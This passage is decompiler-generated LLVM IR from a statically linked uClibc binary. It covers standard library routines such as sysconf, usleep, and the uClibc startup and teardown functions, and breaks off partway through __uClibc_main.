  %v3_805134f = call i32 @__libc_nanosleep(%timespec* %v2_805134f, i32 %v2_8051342)
  store i32 %v3_805134f, i32* %eax.global-to-local, align 4
  store i32 %v3_805134f, i32* @edi, align 4
  %v1_8051356 = call i32 @__errno_location(i32 %v2_8051342)
  store i32 %v1_8051356, i32* %eax.global-to-local, align 4
  store i32 %v1_8051356, i32* @ebx, align 4
  %v1_8051360 = inttoptr i32 %v1_8051356 to i32*
  %v2_8051360 = load i32, i32* %v1_8051360, align 4
  store i32 %v2_8051360, i32* @esi, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8051367 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8051367 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8051367, i32 0)
  store i32 %v4_8051367, i32* %eax.global-to-local, align 4
  %v0_805136c = load i32, i32* @esi, align 4
  %v1_805136c = load i32, i32* @ebx, align 4
  %v2_805136c = inttoptr i32 %v1_805136c to i32*
  store i32 %v0_805136c, i32* %v2_805136c, align 4
  %v0_8051396.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051393

dec_label_pc_8051370:                             ; preds = %dec_label_pc_8051336
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8051376 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8051376 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8051376, i32 0)
  store i32 %v4_8051376, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805138c

dec_label_pc_8051381:                             ; preds = %dec_label_pc_80512b3
  %v2_8051383 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8051383, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805138c

dec_label_pc_805138c:                             ; preds = %dec_label_pc_8051370, %dec_label_pc_8051381
  %storemerge3.pre-phi = phi i32 [ %v2_8051342, %dec_label_pc_8051370 ], [ %v2_8051383, %dec_label_pc_8051381 ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v2_805138c = bitcast i32* %stack_var_-24 to %timespec*
  %v3_805138c = call i32 @__libc_nanosleep(%timespec* %v2_805138c, i32 %storemerge3.pre-phi)
  store i32 %v3_805138c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051393

dec_label_pc_8051393:                             ; preds = %dec_label_pc_805134b, %dec_label_pc_805138c
  %v0_8051396 = phi i32 [ %v0_8051396.pre, %dec_label_pc_805134b ], [ %v3_805138c, %dec_label_pc_805138c ]
  %v1_8051396 = icmp eq i32 %v0_8051396, 0
  br i1 %v1_8051396, label %dec_label_pc_80513b3, label %dec_label_pc_805139a

dec_label_pc_805139a:                             ; preds = %dec_label_pc_8051393
  %v4_80513aa = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_80513aa, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80513ba

dec_label_pc_80513b3:                             ; preds = %entry, %dec_label_pc_8051393
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80513ba

dec_label_pc_80513b7:                             ; preds = %dec_label_pc_80512dc, %dec_label_pc_8051297, %dec_label_pc_8051269
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80513ba

dec_label_pc_80513ba:                             ; preds = %dec_label_pc_80513b3, %dec_label_pc_805139a, %dec_label_pc_805130e, %dec_label_pc_80513b7
  %v0_80513c4 = phi i32 [ 0, %dec_label_pc_80513b3 ], [ %v4_80513aa, %dec_label_pc_805139a ], [ %v0_80513c4.pre, %dec_label_pc_805130e ], [ -1, %dec_label_pc_80513b7 ]
  store i32 %v0_805123f, i32* @ebx, align 4
  store i32 %v0_805123e, i32* @esi, align 4
  store i32 %v0_805123d, i32* @edi, align 4
  ret i32 %v0_80513c4

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_8051356, { 1, 0, 2 }
  uselistorder i32 %v2_8051342, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_80512d9, { 2, 1, 0 }
  uselistorder i32 %v2_8051298, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_805127f, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_8051266, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32 %tmp11, { 0, 2, 1 }
  uselistorder i32* %edx.global-to-local, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 21 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @__GI_sigprocmask, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigaddset, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_80513ba, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80513b3, { 1, 0 }
  uselistorder label %dec_label_pc_8051393, { 1, 0 }
  uselistorder label %dec_label_pc_805138c, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  switch i32 %arg1, label %dec_label_pc_80513e7 [
    i32 0, label %dec_label_pc_80513f7
    i32 1, label %dec_label_pc_80514dc
    i32 2, label %dec_label_pc_8051401
    i32 3, label %dec_label_pc_805140b
    i32 4, label %dec_label_pc_8051415
    i32 5, label %dec_label_pc_80514ab
    i32 6, label %dec_label_pc_805141d
    i32 7, label %dec_label_pc_80513dd
    i32 8, label %dec_label_pc_80513dd
    i32 9, label %dec_label_pc_80513dd
    i32 10, label %dec_label_pc_80513dd
    i32 11, label %dec_label_pc_80513dd
    i32 12, label %dec_label_pc_80513dd
    i32 13, label %dec_label_pc_80513dd
    i32 14, label %dec_label_pc_80513dd
    i32 15, label %dec_label_pc_80513dd
    i32 16, label %dec_label_pc_80513dd
    i32 17, label %dec_label_pc_80513dd
    i32 18, label %dec_label_pc_80513dd
    i32 19, label %dec_label_pc_80513dd
    i32 20, label %dec_label_pc_80513dd
    i32 21, label %dec_label_pc_80513dd
    i32 22, label %dec_label_pc_80513dd
    i32 23, label %dec_label_pc_80514dc
    i32 24, label %dec_label_pc_80514dc
    i32 25, label %dec_label_pc_80514e8
    i32 26, label %dec_label_pc_80514b9
    i32 27, label %dec_label_pc_80514dc
    i32 28, label %dec_label_pc_805142f
    i32 29, label %dec_label_pc_80514b2
    i32 30, label %dec_label_pc_8051427
    i32 31, label %dec_label_pc_80514c7
    i32 32, label %dec_label_pc_80514dc
    i32 33, label %dec_label_pc_80514dc
    i32 34, label %dec_label_pc_80514dc
    i32 35, label %dec_label_pc_80514c0
    i32 36, label %dec_label_pc_80514ef
    i32 37, label %dec_label_pc_80514f6
    i32 38, label %dec_label_pc_80514ef
    i32 39, label %dec_label_pc_8051439
    i32 40, label %dec_label_pc_80514fd
    i32 41, label %dec_label_pc_80514dc
    i32 42, label %dec_label_pc_80514c7
    i32 43, label %dec_label_pc_80514f6
    i32 44, label %dec_label_pc_8051504
    i32 45, label %dec_label_pc_80514f6
    i32 46, label %dec_label_pc_80514b2
    i32 47, label %dec_label_pc_80514b2
    i32 48, label %dec_label_pc_80514b2
    i32 49, label %dec_label_pc_80514dc
    i32 50, label %dec_label_pc_80514dc
    i32 51, label %dec_label_pc_80514b2
    i32 52, label %dec_label_pc_80514b2
    i32 53, label %dec_label_pc_80514dc
    i32 54, label %dec_label_pc_80514dc
    i32 55, label %dec_label_pc_80514dc
    i32 56, label %dec_label_pc_80514dc
    i32 57, label %dec_label_pc_80514dc
    i32 58, label %dec_label_pc_80514dc
    i32 59, label %dec_label_pc_80514dc
    i32 60, label %dec_label_pc_80514dc
    i32 61, label %dec_label_pc_80514dc
    i32 62, label %dec_label_pc_80514dc
    i32 63, label %dec_label_pc_80514dc
    i32 64, label %dec_label_pc_80514dc
    i32 65, label %dec_label_pc_80514dc
    i32 66, label %dec_label_pc_80514dc
    i32 67, label %dec_label_pc_80513dd
    i32 68, label %dec_label_pc_80513dd
    i32 69, label %dec_label_pc_80514c0
    i32 70, label %dec_label_pc_80514c0
    i32 71, label %dec_label_pc_80514c0
    i32 72, label %dec_label_pc_80514c7
    i32 73, label %dec_label_pc_80514ce
    i32 74, label %dec_label_pc_80514d5
    i32 75, label %dec_label_pc_8051443
    i32 76, label %dec_label_pc_80514d5
    i32 77, label %dec_label_pc_80513dd
    i32 78, label %dec_label_pc_80513dd
    i32 79, label %dec_label_pc_80513dd
    i32 80, label %dec_label_pc_80513dd
    i32 81, label %dec_label_pc_80513dd
    i32 82, label %dec_label_pc_80513dd
    i32 83, label %dec_label_pc_80513dd
    i32 84, label %dec_label_pc_80513dd
    i32 85, label %dec_label_pc_80514dc
    i32 86, label %dec_label_pc_80514dc
    i32 87, label %dec_label_pc_80514b9
    i32 88, label %dec_label_pc_805144d
    i32 89, label %dec_label_pc_8051457
    i32 90, label %dec_label_pc_80514ce
    i32 91, label %dec_label_pc_80513dd
    i32 92, label %dec_label_pc_80513dd
    i32 93, label %dec_label_pc_80513dd
    i32 94, label %dec_label_pc_80513dd
    i32 95, label %dec_label_pc_80514b2
    i32 96, label %dec_label_pc_80514dc
    i32 97, label %dec_label_pc_80514dc
    i32 98, label %dec_label_pc_80513dd
    i32 99, label %dec_label_pc_80513dd
    i32 100, label %dec_label_pc_80513dd
    i32 101, label %dec_label_pc_8051461
    i32 102, label %dec_label_pc_80514a4
    i32 103, label %dec_label_pc_80514e1
    i32 104, label %dec_label_pc_80514b9
    i32 105, label %dec_label_pc_805146b
    i32 106, label %dec_label_pc_80514c7
    i32 107, label %dec_label_pc_80514c7
    i32 108, label %dec_label_pc_80514ab
    i32 109, label %dec_label_pc_80514e8
    i32 110, label %dec_label_pc_8051504
    i32 111, label %dec_label_pc_80514a4
    i32 112, label %dec_label_pc_80514e1
    i32 113, label %dec_label_pc_8051504
    i32 114, label %dec_label_pc_8051475
    i32 115, label %dec_label_pc_80514fd
    i32 116, label %dec_label_pc_80514dc
    i32 117, label %dec_label_pc_80514dc
    i32 118, label %dec_label_pc_805147f
    i32 119, label %dec_label_pc_8051489
    i32 120, label %dec_label_pc_80514f6
    i32 121, label %dec_label_pc_80514b9
    i32 122, label %dec_label_pc_80514b9
    i32 123, label %dec_label_pc_80514b9
    i32 124, label %dec_label_pc_80514b9
    i32 125, label %dec_label_pc_80513dd
    i32 126, label %dec_label_pc_80513dd
    i32 127, label %dec_label_pc_80514dc
    i32 128, label %dec_label_pc_80514dc
    i32 129, label %dec_label_pc_80513dd
    i32 130, label %dec_label_pc_80513dd
    i32 131, label %dec_label_pc_80514dc
    i32 149, label %dec_label_pc_8051490
  ]

dec_label_pc_80513dd:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8051509

dec_label_pc_80513e7:                             ; preds = %entry
  %v1_80513e7 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_80513ec = inttoptr i32 %v1_80513e7 to i32*
  store i32 22, i32* %v1_80513ec, align 4
  br label %dec_label_pc_80514dc

dec_label_pc_80513f7:                             ; preds = %entry
  br label %dec_label_pc_8051509

dec_label_pc_8051401:                             ; preds = %entry
  br label %dec_label_pc_8051509

dec_label_pc_805140b:                             ; preds = %entry
  br label %dec_label_pc_8051509

dec_label_pc_8051415:                             ; preds = %entry
  %v0_8051418 = call i32 @getdtablesize()
  br label %dec_label_pc_805141d

dec_label_pc_805141d:                             ; preds = %entry, %dec_label_pc_8051415
  br label %dec_label_pc_8051509

dec_label_pc_8051427:                             ; preds = %entry
  %v3_805142a = call i32 @__GI_getpagesize(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_805142f

dec_label_pc_805142f:                             ; preds = %entry, %dec_label_pc_8051427
  br label %dec_label_pc_8051509

dec_label_pc_8051439:                             ; preds = %entry
  br label %dec_label_pc_8051509

dec_label_pc_8051443:                             ; preds = %entry
  br label %dec_label_pc_8051509

dec_label_pc_805144d:                             ; preds = %entry
  br label %dec_label_pc_8051509

dec_label_pc_8051457:                             ; preds = %entry
  br label %dec_label_pc_8051509

dec_label_pc_8051461:                             ; preds = %entry
  br label %dec_label_pc_8051509

dec_label_pc_805146b:                             ; preds = %entry
  br label %dec_label_pc_8051509

dec_label_pc_8051475:                             ; preds = %entry
  br label %dec_label_pc_8051509

dec_label_pc_805147f:                             ; preds = %entry
  br label %dec_label_pc_8051509

dec_label_pc_8051489:                             ; preds = %entry
  br label %dec_label_pc_8051509

dec_label_pc_8051490:                             ; preds = %entry
  %v5_8051496 = call i32 @__GI_clock_getres(i32 1, %timespec* null, i32 149, i32 149)
  %v2_805149e = icmp slt i32 %v5_8051496, 0
  %v1_80514a0 = icmp eq i1 %v2_805149e, false
  br i1 %v1_80514a0, label %dec_label_pc_80514b2, label %dec_label_pc_80514dc

dec_label_pc_80514a4:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051509

dec_label_pc_80514ab:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051509

dec_label_pc_80514b2:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_8051490
  br label %dec_label_pc_8051509

dec_label_pc_80514b9:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8051509

dec_label_pc_80514c0:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8051509

dec_label_pc_80514c7:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8051509

dec_label_pc_80514ce:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051509

dec_label_pc_80514d5:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051509

dec_label_pc_80514dc:                             ; preds = %dec_label_pc_8051490, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_80513e7
  br label %dec_label_pc_8051509

dec_label_pc_80514e1:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051509

dec_label_pc_80514e8:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051509

dec_label_pc_80514ef:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051509

dec_label_pc_80514f6:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8051509

dec_label_pc_80514fd:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051509

dec_label_pc_8051504:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_8051509

dec_label_pc_8051509:                             ; preds = %dec_label_pc_80514fd, %dec_label_pc_80514f6, %dec_label_pc_80514ef, %dec_label_pc_80514e8, %dec_label_pc_80514e1, %dec_label_pc_80514d5, %dec_label_pc_80514ce, %dec_label_pc_80514c7, %dec_label_pc_80514c0, %dec_label_pc_80514b9, %dec_label_pc_80514ab, %dec_label_pc_80514a4, %dec_label_pc_80514b2, %dec_label_pc_8051489, %dec_label_pc_805147f, %dec_label_pc_8051475, %dec_label_pc_805146b, %dec_label_pc_8051461, %dec_label_pc_8051457, %dec_label_pc_805144d, %dec_label_pc_8051443, %dec_label_pc_8051439, %dec_label_pc_805142f, %dec_label_pc_805141d, %dec_label_pc_805140b, %dec_label_pc_8051401, %dec_label_pc_80513f7, %dec_label_pc_80513dd, %dec_label_pc_80514dc, %dec_label_pc_8051504
  %v0_805150c = phi i32 [ 255, %dec_label_pc_80514fd ], [ 2048, %dec_label_pc_80514f6 ], [ 99, %dec_label_pc_80514ef ], [ 20, %dec_label_pc_80514e8 ], [ -128, %dec_label_pc_80514e1 ], [ 1024, %dec_label_pc_80514d5 ], [ 4, %dec_label_pc_80514ce ], [ 32, %dec_label_pc_80514c7 ], [ 256, %dec_label_pc_80514c0 ], [ 2147483647, %dec_label_pc_80514b9 ], [ 16, %dec_label_pc_80514ab ], [ 127, %dec_label_pc_80514a4 ], [ 200112, %dec_label_pc_80514b2 ], [ 9, %dec_label_pc_8051489 ], [ 65535, %dec_label_pc_805147f ], [ -32768, %dec_label_pc_8051475 ], [ -2147483648, %dec_label_pc_805146b ], [ 8, %dec_label_pc_8051461 ], [ 500, %dec_label_pc_8051457 ], [ 4096, %dec_label_pc_805144d ], [ 16384, %dec_label_pc_8051443 ], [ 1000, %dec_label_pc_8051439 ], [ 32768, %dec_label_pc_805142f ], [ 6, %dec_label_pc_805141d ], [ 65536, %dec_label_pc_805140b ], [ 100, %dec_label_pc_8051401 ], [ 131072, %dec_label_pc_80513f7 ], [ 1, %dec_label_pc_80513dd ], [ -1, %dec_label_pc_80514dc ], [ 32767, %dec_label_pc_8051504 ]
  ret i32 %v0_805150c

; uselistorder directives
  uselistorder i32 32768, { 1, 0, 2 }
  uselistorder i32 1000, { 4, 0, 1, 5, 2, 3 }
  uselistorder i32 16384, { 0, 5, 6, 7, 8, 9, 10, 11, 1, 2, 3, 4 }
  uselistorder i32 -2147483648, { 4, 6, 0, 5, 7, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @__GI_getpagesize, { 1, 0 }
  uselistorder i32 ()* @getdtablesize, { 1, 0 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 129, { 1, 0 }
  uselistorder i32 124, { 1, 0 }
  uselistorder i32 123, { 1, 0 }
  uselistorder i32 115, { 2, 0, 1 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 70, { 1, 2, 0 }
  uselistorder i32 65, { 1, 0, 2, 3 }
  uselistorder i32 53, { 1, 0 }
  uselistorder i32 50, { 2, 0, 1 }
  uselistorder i32 38, { 1, 2, 0 }
  uselistorder i32 30, { 5, 1, 6, 0, 2, 3, 4 }
  uselistorder i32 26, { 2, 1, 0 }
  uselistorder i32 23, { 1, 2, 0 }
  uselistorder i32 19, { 2, 1, 0 }
  uselistorder i32 13, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051509, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_80514dc, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_80514b2, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_805142f, { 1, 0 }
  uselistorder label %dec_label_pc_805141d, { 1, 0 }
}

define i32 @usleep(i64 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8051520 = and i64 %arg1, 4294967295
  %v8_8051520 = udiv i64 %v2_8051520, 1000000
  %v9_8051520 = trunc i64 %v8_8051520 to i32
  store i32 %v9_8051520, i32* %stack_var_-8, align 4
  %v2_8051537 = bitcast i32* %stack_var_-8 to %timespec*
  %v3_8051537 = call i32 @__libc_nanosleep(%timespec* %v2_8051537, i32 0)
  ret i32 %v3_8051537

; uselistorder directives
  uselistorder i32 (%timespec*, i32)* @__libc_nanosleep, { 2, 0, 1 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051540 = load i32, i32* @ebx, align 4
  store i32 %v0_8051540, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80590e8.258 to i32), i32 -134582504), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80590e8.258 to i32), i32 -134582504), i32 2), i32 0), label %dec_label_pc_8051554, label %dec_label_pc_8051561

dec_label_pc_8051554:                             ; preds = %entry, %dec_label_pc_8051554
  %v1_805155b6 = phi i32 [ %v1_805155b, %dec_label_pc_8051554 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80590e8.258 to i32), i32 -134582504), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_805155b.259 to i32), i32* %stack_var_-16, align 4
  %v5_8051554 = mul i32 %v1_805155b6, 4
  %v6_8051554 = add i32 %v5_8051554, ptrtoint (i32* @global_var_80590e8.258 to i32)
  %v7_8051554 = inttoptr i32 %v6_8051554 to i32*
  %v8_8051554 = load i32, i32* %v7_8051554, align 4
  call void @__pseudo_call(i32 %v8_8051554)
  %v0_805155b.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_805155b = add i32 %v0_805155b.pre, -1
  store i32 %v1_805155b, i32* %ebx.global-to-local, align 4
  %v10_805155c = icmp eq i32 %v0_805155b.pre, 0
  %v1_805155f = icmp eq i1 %v10_805155c, false
  br i1 %v1_805155f, label %dec_label_pc_8051554, label %dec_label_pc_8051561

dec_label_pc_8051561:                             ; preds = %dec_label_pc_8051554, %entry
  %v0_8051561 = load i32, i32* @global_var_80603b4.260, align 4
  %v1_8051566 = icmp eq i32 %v0_8051561, 0
  br i1 %v1_8051566, label %dec_label_pc_805156c, label %dec_label_pc_805156a

dec_label_pc_805156a:                             ; preds = %dec_label_pc_8051561
  %v0_805156a = load i32, i32* %stack_var_-16, align 4
  %v1_805156a = call i32 @unknown_0(i32 %v0_805156a)
  br label %dec_label_pc_805156c

dec_label_pc_805156c:                             ; preds = %dec_label_pc_805156a, %dec_label_pc_8051561
  %v0_805156c = load i32, i32* @global_var_80603b8.261, align 8
  %v1_8051572 = icmp eq i32 %v0_805156c, 0
  br i1 %v1_8051572, label %dec_label_pc_805157b, label %dec_label_pc_8051576

dec_label_pc_8051576:                             ; preds = %dec_label_pc_805156c
  %v2_8051578 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051578, i32* %ebx.global-to-local, align 4
  %v0_8051579 = load i32, i32* %stack_var_-16, align 4
  %v1_8051579 = call i32 @unknown_0(i32 %v0_8051579)
  br label %dec_label_pc_805157b

dec_label_pc_805157b:                             ; preds = %dec_label_pc_805156c, %dec_label_pc_8051576
  %v2_805157b = load i32, i32* %stack_var_-16, align 4
  %v2_805157c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805157c, i32* @edx, align 4
  ret i32 %v2_805157b

; uselistorder directives
  uselistorder i32 %v1_805155b, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 2, 1, 0, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_805157b, { 1, 0 }
  uselistorder label %dec_label_pc_8051554, { 1, 0 }
}

define i32 @__pthread_return_0(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8051582 = load i32, i32* @eax, align 4
  ret i32 %v0_8051582
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8051583 = load i32, i32* @esi, align 4
  %v0_8051584 = load i32, i32* @ebx, align 4
  store i32 %v0_8051584, i32* %stack_var_-8, align 4
  %v0_8051588 = load i32, i32* @eax, align 4
  store i32 %v0_8051588, i32* @esi, align 4
  %v0_805158a = load i32, i32* @edx, align 4
  store i32 %v0_805158a, i32* @ebx, align 4
  %v4_805158f = call i32 @__libc_fcntl(i32 %v0_8051588, i32 1, i32 %tmp6)
  %v8_8051597 = icmp eq i32 %v4_805158f, -1
  %v1_8051598 = icmp eq i1 %v8_8051597, false
  br i1 %v1_8051598, label %dec_label_pc_80515b3, label %dec_label_pc_805159a

dec_label_pc_805159a:                             ; preds = %entry
  %v0_805159c = load i32, i32* @ebx, align 4
  %v5_80515a2 = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8057c60.262, i32 0, i32 0), i32 %v0_805159c)
  %v1_80515aa = load i32, i32* @esi, align 4
  %v12_80515aa = icmp eq i32 %v5_80515a2, %v1_80515aa
  br i1 %v12_80515aa, label %dec_label_pc_80515b3, label %dec_label_pc_80515ae

dec_label_pc_80515ae:                             ; preds = %dec_label_pc_805159a
  %v0_80515ae = call i32 @abort()
  br label %dec_label_pc_80515b3

dec_label_pc_80515b3:                             ; preds = %dec_label_pc_805159a, %entry, %dec_label_pc_80515ae
  %v2_80515b3 = load i32, i32* %stack_var_-12, align 4
  %v2_80515b4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80515b4, i32* @ebx, align 4
  store i32 %v0_8051583, i32* @esi, align 4
  ret i32 %v2_80515b3

; uselistorder directives
  uselistorder i32 ()* @abort, { 0, 3, 2, 4, 1 }
  uselistorder i32 (i8*, i32)* @__libc_open, { 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_fcntl, { 0, 1, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder label %dec_label_pc_80515b3, { 2, 0, 1 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_80515ba = load i8, i8* @global_var_80603bc.263, align 4
  %v1_80515ba = icmp eq i8 %v0_80515ba, 0
  %v1_80515c1 = icmp eq i1 %v1_80515ba, false
  br i1 %v1_80515c1, label %entry.dec_label_pc_80515f3_crit_edge, label %dec_label_pc_80515c3

entry.dec_label_pc_80515f3_crit_edge:             ; preds = %entry
  %v0_80515f6.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_80515f3

dec_label_pc_80515c3:                             ; preds = %entry
  store i8 1, i8* @global_var_80603bc.263, align 4
  store i32 4096, i32* @global_var_80603b0.188, align 16
  %v0_80515ee = call i32 @_stdio_init()
  br label %dec_label_pc_80515f3

dec_label_pc_80515f3:                             ; preds = %entry.dec_label_pc_80515f3_crit_edge, %dec_label_pc_80515c3
  %v0_80515f6 = phi i32 [ %v0_80515f6.pre, %entry.dec_label_pc_80515f3_crit_edge ], [ %v0_80515ee, %dec_label_pc_80515c3 ]
  ret i32 %v0_80515f6

; uselistorder directives
  uselistorder i8* @global_var_80603bc.263, { 1, 0 }
  uselistorder label %dec_label_pc_80515f3, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp30 = ptrtoint i32* %arg2 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %v0_80515f9 = load i32, i32* @esi, align 4
  store i32 %tmp30, i32* @edi, align 4
  store i32 %arg6, i32* @global_var_80603a8.264, align 8
  store i32 %arg5, i32* @global_var_80603b8.261, align 8
  %v2_805162e = mul i32 %arg1, 4
  %v3_805162e = add i32 %tmp30, %v2_805162e
  %v1_8051631 = add i32 %v3_805162e, 4
  store i32 %v1_8051631, i32* @global_var_80603ac.256, align 4
  %v3_8051639 = load i32, i32* %arg2, align 4
  %v14_8051639 = icmp eq i32 %v1_8051631, %v3_8051639
  %v1_805163b = icmp eq i1 %v14_8051639, false
  br i1 %v1_805163b, label %dec_label_pc_8051643, label %dec_label_pc_805163d

dec_label_pc_805163d:                             ; preds = %entry
  store i32 %v3_805162e, i32* @global_var_80603ac.256, align 4
  br label %dec_label_pc_8051643

dec_label_pc_8051643:                             ; preds = %entry, %dec_label_pc_805163d
  store i32 0, i32* %stack_var_-168, align 4
  %v2_8051648 = ptrtoint i32* %stack_var_-136 to i32
  %v3_805164d = bitcast i32* %stack_var_-136 to i8*
  %v4_805164d = call i32 @__GI_memset(i8* %v3_805164d, i32 0, i32 120)
  %v0_8051652 = load i32, i32* @global_var_80603ac.256, align 4
  br label %dec_label_pc_805165a

dec_label_pc_805165a:                             ; preds = %dec_label_pc_805165a, %dec_label_pc_8051643
  %v0_805165a = phi i32 [ %v1_805165d, %dec_label_pc_805165a ], [ %v0_8051652, %dec_label_pc_8051643 ]
  %v1_805165a = inttoptr i32 %v0_805165a to i32*
  %v2_805165a = load i32, i32* %v1_805165a, align 4
  %v3_805165a = icmp eq i32 %v2_805165a, 0
  %v1_805165d = add i32 %v0_805165a, 4
  %v1_8051660 = icmp eq i1 %v3_805165a, false
  br i1 %v1_8051660, label %dec_label_pc_805165a, label %dec_label_pc_8051681.preheader

dec_label_pc_8051681.preheader:                   ; preds = %dec_label_pc_805165a
  store i32 %v1_805165d, i32* @ebx, align 4
